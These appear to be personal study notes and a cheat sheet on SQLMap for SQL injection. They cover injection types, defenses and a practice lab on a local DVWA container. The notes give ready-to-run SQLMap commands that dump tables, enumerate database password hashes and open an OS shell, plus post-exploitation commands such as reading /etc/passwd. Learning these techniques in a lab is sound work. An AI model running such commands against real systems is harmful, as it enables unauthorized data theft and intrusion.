# SQLMap Cheat Sheet & Notes

## 🛠️ What is SQLMap?

SQLMap is an open-source tool that automates the process of detecting and exploiting SQL injection (SQLi) vulnerabilities in web applications. It can even be used to gain access to the underlying database and operating system.

### 🔍 Features:

- Database fingerprinting
- Fetching database data
- Accessing the underlying file system
- Executing commands on the OS via out-of-band connections

### 🔥 Supported SQLi Types:

- Boolean-Based Blind
- Time-Based Blind
- Error-Based
- UNION Query-Based
- Stacked Queries

---

## 💻 SQLMap Basic Commands

### General Flags

- `--batch`: Accept default answers to all prompts

### Common Use Cases

```bash
sqlmap -u "url?id=1" --batch --banner             # Retrieve DBMS banner
sqlmap -u "url?id=1" --batch --passwords          # Enumerate DBMS user passwords
sqlmap -u "url?id=1" --batch --dbs                # List all databases
sqlmap -u "url?id=1" --batch --tables -D <db>     # List tables in a database
sqlmap -u "url?id=1" --batch --dump -T <table> -D <db>  # Dump table contents
sqlmap -u "url?id=1" --batch --os-shell           # Gain OS shell if possible
```

### Example Post-Exploitation Commands:

```bash
pwd
whoami
ls /
cat /etc/passwd
```

---

## ⚔️ What Can a Successful SQLi Do?

- Read sensitive data from the database
- Modify/Insert/Delete database data
- Execute administrative DB operations
- Extract file contents from the DB file system
- Write files to the server
- Execute OS-level commands

---

## 🧠 Categories of SQL Injection

### 1. In-Band (Classical SQLi)

- **Error-Based**: Leverage DB error messages for data extraction
- **Union-Based**: Use UNION operator to extract data from other tables

### 2. Out-Of-Band

- Uses different communication channels (e.g., HTTP, DNS)
- Requires:
  - Vulnerable app and DB
  - Outbound request permission from the DB
  - Sufficient DB privileges

### 3. Inferential (Blind SQLi)

- Data is not directly returned
- Relies on:
  - Boolean conditions
  - Time delays (Time-Based Blind SQLi)

---

## 🧪 Practice with DVWA (Damn Vulnerable Web Application)

### 🐳 Run DVWA in Docker

```bash
sudo apt install -y docker.io
sudo systemctl enable docker --now
sudo docker run hello-world
sudo docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

### 🧬 SQLMap on DVWA (Low Security Level)

```bash
sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=123&Submit=Submit#" \
  --cookie="PHPSESSID=...; security=low" --tables

sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=123&Submit=Submit#" \
  --cookie="PHPSESSID=...; security=low" --schema --batch

sqlmap -u "http://127.0.0.1/vulnerabilities/sqli/?id=123&Submit=Submit#" \
  --cookie="PHPSESSID=...; security=low" --dump -T users --batch

sqlmap --url "http://127.0.0.1/vulnerabilities/sqli/?id=1&Submit=Submit#" \
  --cookie="security=low; PHPSESSID=..." -D dvwa -T users --columns
```

---

## 🛡️ SQL Injection Defense Mechanisms

1. **Input Sanitization**: Remove/escape special characters (`'`, `--`, `;`, etc.)
2. **Prepared Statements**: Use parameterized queries (e.g., `?`, `$1`)
3. **Stored Procedures**: Encapsulate queries in routines
4. **Least Privilege Principle**: Restrict DB user privileges
5. **Web Application Firewall (WAF)**: Use tools like ModSecurity
6. **Allowlist Input Validation**: Validate inputs strictly
7. **Error Handling**: Hide DB error messages
8. **Limit Query Results**: Use `LIMIT` / `TOP` to reduce exposure
9. **Regular Audits**: Perform code review, pen-testing, and use tools like SQLMap, Burp Suite
10. **Use ORM**: Frameworks like SQLAlchemy or Hibernate

---

## 📚 Reference Materials

- [SQL Injection Cheat Sheet (GitHub)](https://github.com/AdmiralGaust/SQL-Injection-cheat-sheet)
- [Netsparker SQLi Guide](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [PortSwigger Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [UNION Attacks (PortSwigger)](https://portswigger.net/web-security/sql-injection/union-attacks)
- [Database Info Gathering (PortSwigger)](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [Blind Injections (PortSwigger)](https://portswigger.net/web-security/sql-injection/blind)
- [SQL Zoo](https://sqlzoo.net/)
- [Juice Shop SQLi Hints](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/part2/injection.html)

---

**DLL (Dynamic Link Library)**: A Windows format for reusable functions shared across applications.

---
